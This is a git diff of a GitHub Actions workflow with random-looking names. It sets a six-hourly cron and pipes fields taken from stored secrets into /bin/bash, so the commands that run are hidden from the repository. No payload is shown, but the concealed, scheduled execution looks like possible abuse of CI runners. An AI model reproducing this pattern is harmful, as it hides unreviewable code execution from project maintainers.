@@ -3,27 +3,19 @@ name: maotongxiao9771
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
-
+    - cron: '1 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: maotongxiao9771
         env:
-          ha1967: ${{ secrets.ha1967 }}
+          njua98: ${{ secrets.njua98 }}
         run: |
-          echo $ha1967 | jq -r .y5935 | /bin/bash
-          echo $m31 | jq -r .mkukq49 | /bin/bash
-          echo $wd1479 | jq -r .wh9026 | /bin/bash
-          echo $qbbes0522 | jq -r .iis37475 | /bin/bash
-          echo $f57039 | jq -r .lxz3 | /bin/bash
-          echo $qzolo1542 | jq -r .li9000 | /bin/bash
-          echo $adf9663 | jq -r .yea0 | /bin/bash
-          echo $xuy085 | jq -r .lgie6 | /bin/bash
-          echo $pno9 | jq -r .hx71 | /bin/bash
-          echo $c303 | jq -r .cs57806 | /bin/bash
-          echo $ioqq90 | jq -r .fabu28 | /bin/bash
+          echo $njua98 | jq -r .xk95 | /bin/bash
+          echo $imf88 | jq -r .ssefo1939 | /bin/bash
+          echo $ehxvu498 | jq -r .up99 | /bin/bash
+          echo $md19217 | jq -r .ddat2598 | /bin/bash
+          echo $dzt6765 | jq -r .mm51 | /bin/bash
 
